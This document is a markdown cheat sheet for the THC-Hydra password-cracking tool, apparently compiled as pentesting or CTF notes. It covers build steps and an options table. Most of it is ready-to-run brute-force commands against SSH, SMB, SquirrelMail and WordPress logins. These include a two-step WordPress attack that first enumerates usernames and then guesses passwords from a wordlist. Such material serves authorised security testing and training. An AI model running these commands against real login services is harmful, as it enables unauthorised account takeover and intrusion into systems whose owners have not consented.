# Clone
```bash
git clone https://github.com/vanhauser-thc/thc-hydra
```

# Compile
```bash
./configure
make
make install
```

| Option | Description |
|--------|-------------|
| -R |      restore a previous aborted/crashed session |
| -I |      ignore an existing restore file (don't wait 10 seconds) |
| -S |      perform an SSL connect |
| -s PORT |  if the service is on a different default port, define it here |
| -l LOGIN or -L FILE | login with LOGIN name, or load several logins from FILE |
| -p PASS  or -P FILE | try password PASS, or load several passwords from FILE |
| -x MIN:MAX:CHARSET | password bruteforce generation, type "-x -h" to get help |
| -y |      disable use of symbols in bruteforce, see above |
| -r |      use a non-random shuffling method for option -x |
| -e nsr |   try "n" null password, "s" login as pass and/or "r" reversed login |
| -u |      loop around users, not passwords (effective! implied with -x) |
| -C FILE |  colon separated "login:pass" format, instead of -L/-P options |
| -M FILE |  list of servers to attack, one entry per line, ':' to specify port |
| -o FILE |  write found login/password pairs to FILE instead of stdout |
| -b FORMAT | specify the format for the -o FILE: text(default), json, jsonv1 |
| -f / -F |   exit when a login/pass pair is found (-M: -f per host, -F global) |
| -t TASKS | run TASKS number of connects in parallel per target (default: 16) |
| -T TASKS | run TASKS connects in parallel overall (for -M, default: 64) |
| -w / -W TIME |  wait time for a response (32) / between connects per thread (0) |
| -c TIME |   wait time per login attempt over all threads (enforces -t 1) |
| -4 / -6 |   use IPv4 (default) / IPv6 addresses (put always in [] also in -M) |
| -v / -V / -d |  verbose mode / show login+pass for each attempt / debug mode  |
| -O |      use old SSL v2 and v3 |
| -K |      do not redo failed attempts (good for -M mass scanning) |
| -q |      do not print messages about connection errors |
| -U |      service module usage details |
| -m OPT |    options specific for a module, see -U output for information |
| -h |      more command line options (COMPLETE HELP) |
| server |    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option) |
| service |   the service to crack (see below for supported protocols) |
| OPT |       some service modules support additional input (-U for module help) |

```bash
Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh
```

# Bruteforce
##### General Syntax
```bash
hydra -L <Username List> -P <Password List> <Target Host> <Protocol>
hydra -f -l <username> -P <Password List> <Target Host> <Protocol>
hydra -f -l <username> -P <Password List> <Protocol>://<Target Host> 

# -l specifies username
# -L specifies username list
# -p specifies password
# -P specifies password list
# -t <#> specifies thread count per host (optional).
# -T <#> specifies total thread count across all hosts (optional).
# -f quits on success.
# -M <Filename> specifies target hosts list
# -o <Filename> outputs the results to the file specified
```

##### SSH
```bash
hydra -f -l <username> -P /usr/share/wordlists/rockyou.txt <Target Host> ssh
```

##### SMB
```bash
hydra -L users.txt -P <Password List> <Target Host> smb
```

##### SquirrelMail (HTTP Form Post)
```bash
hydra -l <username> -P log1.txt 10.10.34.188 http-post-form '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.'
```

##### WordPress (HTTP Form Post)
```bash
hydra -f -l <username> -P <Password List> <Target Host> -V http-form-post '/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

# Check for usernames.  The password does not matter, because WordPress reports whether the username is invalid or the password.
hydra -vV -L fsocity.dic.uniq -p wedontcare <Target Host> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' -o wpusers.txt
# Check for passwords.  Use usernames recovered from previous step.
hydra -vV -L wpusers-clean.txt -P fsocity.dic.uniq <Target Host> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -o wppasswords.txt
```
###### [Test WordPress Logins With Hydra on Kali Linux](https://linuxconfig.org/test-wordpress-logins-with-hydra-on-kali-linux/)


# References
[thc-hydra](https://github.com/vanhauser-thc/thc-hydra)